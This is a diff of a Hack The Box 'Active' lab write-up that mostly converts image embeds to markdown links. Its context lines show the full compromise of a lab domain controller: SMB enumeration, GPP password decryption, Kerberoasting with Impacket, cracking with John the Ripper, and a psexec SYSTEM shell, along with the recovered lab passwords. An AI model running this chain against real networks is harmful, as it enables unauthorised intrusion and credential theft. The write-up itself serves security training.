@@ -68,7 +68,7 @@ After the scan, we extract the list of open ports using a custom script:
 extractPorts allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/extractPorts.png]]
+![extractPorts](screenshots/extractPorts.png)
 
 ### 1.3 Targeted Scan
 
@@ -88,8 +88,9 @@ Let's analyse de result with targeted file:
 cat targeted -l java
 ```
 
-![[cat_targeted.png]]
- Better color composition as bash command
+![cat_targeted](screenshots/cat_targeted.png)
+
+Better color composition as bash command
 
 | Port   | Service         | Description                                 |
 | ------ | --------------- | ------------------------------------------- |
@@ -134,7 +135,7 @@ We also run CrackMapExec to get a quick overview:
 crackmapexec smb 10.10.10.100
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/crackmapexec.png]]
+![crackmapexec](screenshots/crackmapexec.png)
 
 Confirms the hostname and domain, indicating that we are indeed dealing with a DC.
 
@@ -146,7 +147,7 @@ We enumerate the available shares using unauthenticated access (null session):
 smbclient -L 10.10.10.100 -N
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/smbclient_null.png]]
+![smbclient_null](screenshots/smbclient_null.png)
 
 Several shares are listed, and public access is allowed to at least one of them.
 
@@ -158,7 +159,7 @@ We list available shares and their permissions using `smbmap`:
 smbmap -H 10.10.10.100
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/smbmap.png]]
+![smbmap](screenshots/smbmap.png)
 
 Access is granted only to the `Replication` share.
 
@@ -168,21 +169,21 @@ This indicates that we can read files inside the **SYSVOL** structure. We procee
 smbmap -H 10.10.10.100 -r Replication
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/smbmap_replication.png]]
+![smbmap_replication](screenshots/smbmap_replication.png)
 
 The structure closely resembles the typical **SYSVOL** directory used for GPO deployment in Active Directory environments.
 
-![[smbmap_active.png]]
+![smbmap_active](screenshots/smbmap_active.png)
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/smbmap_policies.png]]
+![smbmap_policies](screenshots/smbmap_policies.png)
 
-![[smbmap_31b2f340.png]]
+![smbmap_31b2f340](screenshots/smbmap_31b2f340.png)
 
-![[smbmap_machine.png]]
+![smbmap_machine](screenshots/smbmap_machine.png)
 
-![[smbmap_preferences.png]]
+![smbmap_preferences](screenshots/smbmap_preferences.png)
 
-![[smbmap_groups.png]]
+![smbmap_groups](screenshots/smbmap_groups.png)
 
 We find `Group.xml`, this file often contains GPP credentials, which are encrypted with a known static key.
 
@@ -196,7 +197,7 @@ smbmap -H 10.10.10.100 --download Replication/active.htb/Policies/{31B2F340-016D
 
 Let's rename and open it:
 
-![[groups_xml.png]]
+![groups_xml](screenshots/groups_xml.png)
 
 There are two interesting values:
 
@@ -211,7 +212,7 @@ We decrypt it using the `gpp-decrypt` tool:
 gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
 ```
 
-![[svg_tgs_credentials.png]]
+![svg_tgs_credentials](screenshots/svg_tgs_credentials.png)
 
 **Credentials retrieved:**  
 Username: `SVC_TGS`  
@@ -225,7 +226,7 @@ We test the credentials with CrackMapExec:
 crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
 
-![[crackmapexec_svg_tgs.png]]
+![crackmapexec_svg_tgs](screenshots/crackmapexec_svg_tgs.png)
 
 Login successful — the credentials are valid.
 
@@ -237,7 +238,7 @@ With valid credentials, we enumerate shares again:
 crackmapexec smb 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
 ```
 
-![[crackmapexec_svg_tgs_shares.png]]
+![crackmapexec_svg_tgs_shares](screenshots/crackmapexec_svg_tgs_shares.png)
 
 We identify access to the **Users** share. We list its contents:
 
@@ -245,7 +246,7 @@ We identify access to the **Users** share. We list its contents:
 smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -r Users/SVC_TGS/Desktop/
 ```
 
-![[user_flag_desktop.png]]
+![user_flag_desktop](screenshots/user_flag_desktop.png)
 
 Inside, we find and download the user flag:
 
@@ -253,7 +254,7 @@ Inside, we find and download the user flag:
 smbmap -H 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
 ```
 
-![[user_flag.png]]
+![user_flag](screenshots/user_flag.png)
 
 ✅ **User flag obtained**
 
@@ -279,7 +280,7 @@ We can use `rpcclient` to interact with the SMB RPC service and extract a list o
 rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomusers'
 ```
 
-![[rpcclient_enumdomusers.png]]
+![rpcclient_enumdomusers](screenshots/rpcclient_enumdomusers.png)
 
 Lists all users in the domain along with their **RID** values.  
 This information can be useful for further password spraying, AS-REP Roasting, or targeted Kerberoasting.
@@ -292,7 +293,7 @@ Similarly, we enumerate all domain groups:
 rpcclient -U "SVC_TGS%GPPstillStandingStrong2k18" 10.10.10.100 -c 'enumdomgroups'
 ```
 
-![[rpcclient_enmdomgroups.png]]
+![rpcclient_enmdomgroups](screenshots/rpcclient_enmdomgroups.png)
 
 Displays group names and RIDs.  
 Special attention should be given to administrative or privileged groups such as:
@@ -317,7 +318,7 @@ We attempt to enumerate and request service tickets using **Impacket’s GetUser
 impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
 ```
 
-![[tgs_admin_user.png]]
+![tgs_admin_user](screenshots/tgs_admin_user.png)
 
 ❗ **Issue:** The command fails due to a **time synchronization mismatch** between our attacking machine and the Domain Controller.
 
@@ -332,16 +333,16 @@ sudo apt install ntpsec-ntpdate
 sudo ntpdate -u 10.10.10.100
 ```
 
-![[ntpdate.png]]
+![ntpdate](screenshots/ntpdate.png)
 
 After syncing time, we rerun the command:
 
-![[getuser_spns.png]]
+![getuser_spns](screenshots/getuser_spns.png)
 
 We retrieve a **Ticket Granting Service (TGS)** hash for the **Administrator** account.
 We save the hash to a file named `hash`:
 
-![[hash.png]]
+![hash](screenshots/hash.png)
 
 ### 4.3 Cracking the Hash
 
@@ -351,7 +352,7 @@ We crack the TGS hash offline using **John the Ripper** with the `rockyou.txt` w
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hash
 ```
 
-![[admin_credentials.png]]
+![admin_credentials](screenshots/admin_credentials.png)
 
 ✅ **Password found:**
 
@@ -366,7 +367,7 @@ We test the recovered credentials with CrackMapExec:
 crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'Ticketmaster1968'
 ```
 
-![[GitHub Documentation/EASY/HTB_Active_2_Writeup/screenshots/crackmapexec_admin.png]]
+![crackmapexec_admin](screenshots/crackmapexec_admin.png)
 
 Administrator authentication successful — **full domain compromise achieved**.
 
@@ -395,7 +396,7 @@ Instead, we opt for **psexec.py** from the Impacket toolkit, which uses SMB and 
 psexec.py active.htb/Administrator:Ticketmaster1968@10.10.10.100 cmd.exe
 ```
 
-![[psexec_admin_user.png]]
+![psexec_admin_user](screenshots/psexec_admin_user.png)
 
 A remote shell is obtained as `NT AUTHORITY\SYSTEM`.
 
